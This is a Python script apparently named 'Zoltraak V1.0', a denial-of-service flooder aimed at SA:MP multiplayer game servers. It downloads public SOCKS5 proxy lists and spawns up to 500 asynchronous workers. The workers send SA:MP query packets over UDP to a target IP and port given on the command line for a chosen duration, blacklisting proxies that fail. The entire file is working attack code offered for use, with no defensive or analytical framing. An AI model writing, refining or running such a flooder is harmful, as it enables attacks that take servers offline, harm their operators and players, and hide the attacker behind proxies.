import requests
import asyncio
import socket
import socks
import random
import sys
import struct
import time

proxy_api_urls = [
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://cdn.jsdelivr.net/gh/ObcbO/getproxy/file/socks5.txt"
]

proxies = set()
for url in proxy_api_urls:
    response = requests.get(url)
    proxies.update(response.text.strip().replace('\r', '').split('\n'))

print("███████████████████████████")
print("███████▀▀▀░░░░░░░▀▀▀███████")
print("████▀░░░░░░░░░░░░░░░░░▀████")
print("███│░░░░░░░░░░░░░░░░░░░│███")
print("██▌│░░░░░░░░░░░░░░░░░░░│▐██")
print("██░└┐░░░░░░░░░░░░░░░░░┌┘░██")
print("██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
print("██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
print("██▌░│██████▌░░░▐██████│░▐██")
print("███░│▐███▀▀░░▄░░▀▀███▌│░███")
print("██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██")
print("██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██")
print("████▄─┘██▌░░░░░░░▐██└─▄████")
print("█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
print("████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
print("█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
print("███████▄░░░░░░░░░░░▄███████")
print("██████████▄▄▄▄▄▄▄██████████")
print("███████Zoltraak V1.0███████")
print(f"█████████{len(proxies)} Proxy█████████")
print("███████Raknet SA:MP████████")
print("███████████████████████████")

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
times = int(sys.argv[3])
start_time = time.time()

blacklisted_proxies = set()
whitelisted_proxies = set()

def create_proxied_socket(proxy_host, proxy_port):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
    return s

def tulis_proxy_ke_file():
    with open("prox.txt", "w") as file:
        for proxy in whitelisted_proxies:
            file.write(proxy + "\n")

async def worker():
    global blacklisted_proxies
    target = (target_ip, target_port)
    proxy = random.choice([p for p in proxies if p not in blacklisted_proxies])
    proxy_host = proxy.split(":")[0]
    proxy_port = int(proxy.split(":")[1])
    udp = create_proxied_socket(proxy_host, proxy_port)

    while time.time() - start_time < times:
        if proxy not in blacklisted_proxies:
            try:
                payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
                udp.sendto(payload, target)
            except Exception as error:
                blacklisted_proxies.add(proxy)
                asyncio.create_task(worker())
                break

async def main():
    tasks = []
    while time.time() - start_time < times:
        if len(tasks) < 500:
            task = asyncio.create_task(worker())
            tasks.append(task)

    await asyncio.gather(*tasks)  # Awaits all tasks to complete

asyncio.run(main())
